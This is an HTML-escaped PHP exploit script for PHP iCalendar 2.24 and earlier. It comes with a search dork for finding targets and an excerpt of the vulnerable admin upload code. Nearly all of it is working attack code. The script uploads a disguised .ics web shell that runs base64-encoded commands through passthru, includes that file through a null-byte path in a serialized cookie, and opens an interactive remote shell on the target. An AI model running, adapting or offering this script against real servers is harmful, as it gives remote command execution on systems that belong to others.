&lt;?php

/*
	-----------------------------------------------------------------
	PHP iCalendar &lt;= 2.24 (cookie_language) LFI / File Upload Exploit
	-----------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://phpicalendar.net/
	dork.....: &quot;Powered by PHP iCalendar&quot;
	
	[-] vulnerable code in /admin/index.php
	
	65.	// Add or Update a calendar
	66.	$addupdate_msg 	= &#039;&#039;;
	67.	if ((isset($_POST[&#039;action&#039;]))  &amp;&amp; ($_POST[&#039;action&#039;] == &#039;addupdate&#039;)) {
	68.		for ($filenumber = 1; $filenumber &lt; 6; $filenumber++) {
	69.			$file = $_FILES[&#039;calfile&#039;];
	70.			$addupdate_success = FALSE;
	71.	
	72.			if (!is_uploaded_file_v4($file[&#039;tmp_name&#039;][$filenumber])) {
	73.				$upload_error = get_upload_error($file[&#039;error&#039;][$filenumber]);
	74.			} elseif (!is_uploaded_ics($file[&#039;name&#039;][$filenumber])) {
	75.				$upload_error = $upload_error_type_lang;
	76.			} elseif (!copy_cal($file[&#039;tmp_name&#039;][$filenumber], $file[&#039;name&#039;][$filenumber])) {
	77.				$upload_error = $copy_error_lang . &quot; &quot; . $file[&#039;tmp_name&#039;][$filenumber] . &quot; - &quot; . $calendar_path . &quot;/&quot; . $file[&#039;name&#039;][$filenumber];
	78.			} else {
	79.				$addupdate_success = TRUE;
	80.			}
	81.			
	82.			if ($addupdate_success == TRUE) {
	83.				$addupdate_msg = $addupdate_msg . &#039;&lt;font color=&quot;green&quot;&gt;&#039;.$lang[&#039;l_cal_file&#039;].&#039; #&#039;.$filenumber.&#039;: &#039;.$lang[&#039;l_action_success&#039;].&#039;&lt;/font&gt;&lt;br /&gt;&#039;;
	84.			} else {
	85.				$addupdate_msg = $addupdate_msg . &#039;&lt;font color=&quot;red&quot;&gt;&#039;.$lang[&#039;l_cal_file&#039;].&#039; #&#039;.$filenumber.&#039;: &#039;.$lang[&#039;l_upload_error&#039;].&#039;&lt;/font&gt;&lt;br /&gt;&#039;;
	86.			}
	87.		}
	88.	}
	
	restricted access to this script isn&#039;t properly realized, so an attacker might be able to upload a calendar file
	(with .ics extension) into /calendars directory...multiple file extensions isn&#039;t checked, but &#039;ics&#039; is generally
	recognized as text/calendar MIME type by most servers...so this poc try to include the uploaded file using the
	same LFI bug found by rgod (http://retrogod.altervista.org/phpical_221_incl_xpl.html), that isn&#039;t still patched!
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print &quot;\n+---------------------------------------------------------------------------+&quot;;
print &quot;\n| PHP iCalendar &lt;= 2.24 (cookie_language) LFI / File Upload Exploit by EgiX |&quot;;
print &quot;\n+---------------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......: php $argv[0] host path\n&quot;;
	print &quot;\nExample....: php $argv[0] localhost /&quot;;
	print &quot;\nExample....: php $argv[0] localhost /phpicalendar/\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];

$payload  = &quot;--o0oOo0o\r\n&quot;;
$payload .= &quot;Content-Disposition: form-data; name=\&quot;action\&quot;\r\n\r\n&quot;;
$payload .= &quot;addupdate\r\n&quot;;
$payload .= &quot;--o0oOo0o\r\n&quot;;
$payload .= &quot;Content-Disposition: form-data; name=\&quot;calfile[1]\&quot;; filename=\&quot;fake_cal.ics\&quot;\r\n\r\n&quot;;
$payload .= &quot;BEGIN:VCALENDAR\n&lt;?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${die()} ?&gt;\r\n&quot;;
$payload .= &quot;--o0oOo0o--\r\n&quot;;

$packet   = &quot;POST {$path}admin/index.php HTTP/1.0\r\n&quot;;
$packet  .= &quot;Host: {$host}\r\n&quot;;
$packet  .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
$packet  .= &quot;Content-Type: multipart/form-data; boundary=o0oOo0o\r\n&quot;;
$packet  .= &quot;Connection: close\r\n\r\n&quot;;
$packet  .= $payload;
	
http_send($host, $packet);

$packet  = &quot;GET {$path}preferences.php?action=setcookie HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;

preg_match(&quot;/Set-Cookie: (phpicalendar_[^=]*)=/&quot;, http_send($host, $packet), $cookie);

$data = urlencode(serialize(array(&quot;cookie_language&quot; =&gt; &quot;../calendars/fake_cal.ics&quot;.chr(0))));

while(1)
{
	print &quot;\nphpicalendar-shell# &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$packet  = &quot;GET {$path}print.php HTTP/1.0\r\n&quot;;
		$packet .= &quot;Host: {$host}\r\n&quot;;
		$packet .= &quot;Cookie: {$cookie[1]}={$data}\r\n&quot;;
		$packet .= &quot;Cmd: &quot;.base64_encode($cmd).&quot;\r\n&quot;;
		$packet .= &quot;Connection: close\r\n\r\n&quot;;
		$output  = http_send($host, $packet);
		$shell   = explode(&quot;_code_&quot;, $output);
		preg_match(&quot;/_code_/&quot;, $output) ? print &quot;\n{$shell[1]}&quot; : die(&quot;\n[-] Exploit failed...\n&quot;);
	}
	else break;
}

?&gt;

